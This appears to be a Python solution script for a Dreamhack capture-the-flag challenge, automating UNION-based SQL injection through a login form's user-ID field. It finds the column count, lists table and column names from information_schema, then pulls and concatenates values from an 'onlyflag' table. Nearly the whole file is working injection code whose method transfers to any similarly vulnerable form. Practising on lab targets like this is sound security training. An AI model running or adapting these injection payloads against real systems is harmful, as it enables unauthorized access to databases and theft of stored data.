import requests
from bs4 import BeautifulSoup

url="http://host1.dreamhack.games:18143/"
column_count=1

# 칼럼 갯수 구하기
payload='1'
while True:
    query=f'\'union select {payload} #'
    print(query)
    param= {
    'uid':query,
    'upw':'apple'
    }
    res=requests.post(url,param)
    if res.status_code==200:
        print(res.text)
        break
    else:
        column_count+=1
        payload+=f",{column_count}"
# 테이블명구하기
payload='table_name'
for i in range(2,column_count+1):
    payload+=f", {i}"
table_name="information_schema.tables"
query=f'\'union select {payload} from {table_name} #'
print(query)
param= {
    'uid':query,
    'upw':'apple'
    }
res= requests.post(url, param)
print(res.text)

#칼럼명 구하기
payload='column_name'
for i in range(2,column_count+1):
    payload+=f", {i}"
table_name="information_schema.columns"
query=f'\'union select {payload} from {table_name} where table_name = \'onlyflag\' #'
print(query)
param= {
    'uid':query,
    'upw':'apple'
    }
res= requests.post(url, param)
html_content = res.content
soup=BeautifulSoup(html_content, 'html.parser')
rows = soup.find_all('th', scope='row')
# 알아낸 칼럼들 
columns=[row.get_text(strip=True) for row in rows]
idx=1
for value in columns:
    print(idx, value)
    idx+=1
result=""

#flag찾기
for value in columns:
    payload=value
    for i in range(2,column_count+1):
        payload+=f", {i}"
    table_name="onlyflag"
    query=f'\'union select {payload} from {table_name} #'
    param= {
        'uid':query,
        'upw':'apple'
        }
    res= requests.post(url, param)
    html_content = res.content
    soup=BeautifulSoup(html_content, 'html.parser')
    rows = soup.find_all('th', scope='row')
    colum=[row.get_text(strip=True) for row in rows]
    for col in colum:
        result+=col
print(result)